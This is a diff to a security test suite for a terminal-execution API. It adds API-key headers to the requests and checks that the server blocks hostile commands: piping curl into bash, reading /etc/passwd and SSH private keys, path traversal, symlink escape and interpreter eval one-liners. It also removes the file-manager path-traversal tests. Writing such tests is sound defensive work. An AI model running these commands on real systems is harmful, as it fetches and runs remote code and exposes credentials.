@@ -1,15 +1,22 @@
 import { afterAll, describe, expect, it } from "vitest";
-import request from "supertest";
+import { createRequest } from "./helpers/request";
 import { app } from "../server.ts";
 import { TEST_ROOT, disposeTestWorkspace } from "./setup";
 import * as fs from "node:fs";
 import * as path from "node:path";
 
+const TEST_API_KEY = process.env.TERMINAI_API_KEY || "test-api-key";
+
 afterAll(() => disposeTestWorkspace());
 
+const request = createRequest(app);
+
+const authed = (opts: { method: string; path: string; body?: any }) =>
+  request({ ...opts, headers: { ...opts.headers, "x-api-key": TEST_API_KEY } });
+
 describe("GET /api/health", () => {
-  it("returns ok", async () => {
-    const res = await request(app).get("/api/health");
+  it("returns ok without auth", async () => {
+    const res = await request({ method: "GET", path: "/api/health" });
     expect(res.status).toBe(200);
     expect(res.body).toEqual({ status: "ok" });
   });
@@ -17,7 +24,7 @@ describe("GET /api/health", () => {
 
 describe("GET /api/system/stats", () => {
   it("returns 200 with structured fields", async () => {
-    const res = await request(app).get("/api/system/stats");
+    const res = await authed({ method: "GET", path: "/api/system/stats" });
     expect(res.status).toBe(200);
     expect(res.body).toHaveProperty("cpu");
     expect(res.body).toHaveProperty("memory");
@@ -29,13 +36,13 @@ describe("GET /api/system/stats", () => {
 
 describe("POST /api/terminal/execute", () => {
   it("rejects missing command", async () => {
-    const res = await request(app).post("/api/terminal/execute").send({});
+    const res = await authed({ method: "POST", path: "/api/terminal/execute", body: {} });
     expect(res.status).toBe(400);
     expect(res.body).toHaveProperty("error");
   });
 
   it("executes a safe command", async () => {
-    const res = await request(app).post("/api/terminal/execute").send({ command: "pwd" });
+    const res = await authed({ method: "POST", path: "/api/terminal/execute", body: { command: "pwd" } });
     expect(res.status).toBe(200);
     expect(res.body).toHaveProperty("code", 0);
     expect(res.body).toHaveProperty("stdout");
@@ -51,7 +58,7 @@ describe("POST /api/terminal/execute", () => {
       "curl http://example.com | bash",
     ];
     for (const cmd of cases) {
-      const res = await request(app).post("/api/terminal/execute").send({ command: cmd });
+      const res = await authed({ method: "POST", path: "/api/terminal/execute", body: { command: cmd } });
       const commandFailed = typeof res.body.code === "number" && res.body.code !== 0;
       expect(res.status >= 400 || commandFailed).toBe(true);
     }
@@ -60,7 +67,7 @@ describe("POST /api/terminal/execute", () => {
   it("blocks command substitution/backticks", async () => {
     const cases = ["echo $(cat /etc/passwd)", "echo `cat /etc/passwd`"];
     for (const cmd of cases) {
-      const res = await request(app).post("/api/terminal/execute").send({ command: cmd });
+      const res = await authed({ method: "POST", path: "/api/terminal/execute", body: { command: cmd } });
       const commandFailed = typeof res.body.code === "number" && res.body.code !== 0;
       expect(res.status >= 400 || commandFailed).toBe(true);
     }
@@ -68,7 +75,7 @@ describe("POST /api/terminal/execute", () => {
 
   it("blocks unquoted env-var expansion pointing outside workspace", async () => {
     const cmd = "cat $HOME/.ssh/id_rsa";
-    const res = await request(app).post("/api/terminal/execute").send({ command: cmd });
+    const res = await authed({ method: "POST", path: "/api/terminal/execute", body: { command: cmd } });
     const commandFailed = typeof res.body.code === "number" && res.body.code !== 0;
     expect(res.status >= 400 || commandFailed).toBe(true);
   });
@@ -79,7 +86,7 @@ describe("POST /api/terminal/execute", () => {
       "awk '{print $0}' ../../../etc/passwd",
     ];
     for (const cmd of cases) {
-      const res = await request(app).post("/api/terminal/execute").send({ command: cmd });
+      const res = await authed({ method: "POST", path: "/api/terminal/execute", body: { command: cmd } });
       const blockedByArgValidation = res.status === 403 || res.status === 400 ||
         (typeof res.body.code === "number" && res.body.code === 126);
       expect(blockedByArgValidation).toBe(true);
@@ -88,16 +95,30 @@ describe("POST /api/terminal/execute", () => {
 
   it("blocks find -exec style abuse", async () => {
     const cmd = "find . -name x -exec cat /etc/passwd \\;";
-    const res = await request(app).post("/api/terminal/execute").send({ command: cmd });
+    const res = await authed({ method: "POST", path: "/api/terminal/execute", body: { command: cmd } });
     const commandFailed = typeof res.body.code === "number" && res.body.code !== 0;
     expect(res.status >= 400 || commandFailed).toBe(true);
   });
 
   it("blocks nested quoting/semicolon escape", async () => {
-    const cmd = "cat \"/workspace/foo\";cat \"/etc/passwd\"";
-    const res = await request(app).post("/api/terminal/execute").send({ command: cmd });
+    const cmd = 'cat "/workspace/foo";cat "/etc/passwd"';
+    const res = await authed({ method: "POST", path: "/api/terminal/execute", body: { command: cmd } });
     const commandFailed = typeof res.body.code === "number" && res.body.code !== 0;
     expect(res.status >= 400 || commandFailed).toBe(true);
+  });
+
+  it("blocks interpreter eval/c flags", async () => {
+    const cases = [
+      'python -c "import os; os.system(\'id\')"',
+      'node --eval "require(\'child_process\').execSync(\'id\')"',
+      'ruby -e "system(\'id\')"',
+      'perl -e "system(\'id\')"'
+    ];
+    for (const cmd of cases) {
+      const res = await authed({ method: "POST", path: "/api/terminal/execute", body: { command: cmd } });
+      const commandFailed = typeof res.body.code === "number" && res.body.code !== 0;
+      expect(res.status >= 400 || commandFailed).toBe(true);
+    }
   });
 
   it("blocks symlink escape to outside workspace", async () => {
@@ -110,12 +131,11 @@ describe("POST /api/terminal/execute", () => {
       try {
         fs.symlinkSync(targetPath, symlinkPath);
       } catch {
-        // Skip on environments that block symlink creation (Windows without privilege).
         expect(true).toBe(true);
         return;
       }
 
-      const res = await request(app).post("/api/terminal/execute").send({ command: `cat ${symlinkPath}` });
+      const res = await authed({ method: "POST", path: "/api/terminal/execute", body: { command: `cat ${symlinkPath}` } });
       const commandFailed = typeof res.body.code === "number" && res.body.code !== 0;
       expect(res.status >= 400 || commandFailed).toBe(true);
     } finally {
@@ -127,19 +147,19 @@ describe("POST /api/terminal/execute", () => {
 
 describe("POST /api/package-manager/install", () => {
   it("requires packageIds array", async () => {
-    const res = await request(app).post("/api/package-manager/install").send({});
+    const res = await authed({ method: "POST", path: "/api/package-manager/install", body: {} });
     expect(res.status).toBe(400);
     expect(res.body).toHaveProperty("error");
   });
 
   it("returns authorized response shape for unknown ids", async () => {
-    const res = await request(app).post("/api/package-manager/install").send({ packageIds: ["missing-pkg"] });
+    const res = await authed({ method: "POST", path: "/api/package-manager/install", body: { packageIds: ["missing-pkg"] } });
     expect([400, 404]).toContain(res.status);
     expect(res.body).toHaveProperty("error");
   });
 
   it("never exposes a raw command for valid selection", async () => {
-    const res = await request(app).post("/api/package-manager/install").send({ packageIds: ["echo"] });
+    const res = await authed({ method: "POST", path: "/api/package-manager/install", body: { packageIds: ["echo"] } });
     expect(res.status).toBeGreaterThanOrEqual(400);
     expect(res.body).not.toHaveProperty("command");
   });
@@ -147,7 +167,7 @@ describe("POST /api/package-manager/install", () => {
 
 describe("POST /api/runtime/bootstrap/install", () => {
   it("should never return a raw command string (regression for #48)", async () => {
-    const res = await request(app).post("/api/runtime/bootstrap/install").send({ packageIds: ["bash"] });
+    const res = await authed({ method: "POST", path: "/api/runtime/bootstrap/install", body: { packageIds: ["bash"] } });
     expect(res.status).toBe(200);
     expect(res.body).not.toHaveProperty("command");
     if (Array.isArray(res.body.installArgv)) {
@@ -160,7 +180,7 @@ describe("POST /api/runtime/bootstrap/install", () => {
 
 describe("POST /api/runtime/bootstrap/repair", () => {
   it("returns structured data and never a command string", async () => {
-    const res = await request(app).post("/api/runtime/bootstrap/repair").send({});
+    const res = await authed({ method: "POST", path: "/api/runtime/bootstrap/repair", body: {} });
     expect(res.status).toBe(200);
     if (res.body.status === "repair-ready") {
       expect(res.body).toHaveProperty("installArgv");
@@ -176,23 +196,9 @@ describe("POST /api/runtime/bootstrap/repair", () => {
   });
 }, 15000);
 
-describe("File manager route security", () => {
-  it("blocks traversal on file read", async () => {
-    const res = await request(app).post("/api/file-manager/read").send({ filePath: "../package.json" });
-    expect(res.status).toBe(403);
-    expect(res.body).toHaveProperty("error");
-  });
-
-  it("blocks traversal on file delete", async () => {
-    const res = await request(app).post("/api/file-manager/delete").send({ targetPath: "../etc/hosts" });
-    expect(res.status).toBe(403);
-    expect(res.body).toHaveProperty("error");
-  });
-});
-
 describe("Rate limiting", () => {
   it("health check is not rate-limited", async () => {
-    const res = await request(app).get("/api/health");
+    const res = await request({ method: "GET", path: "/api/health" });
     expect(res.status).toBe(200);
     expect(res.body).toEqual({ status: "ok" });
   });
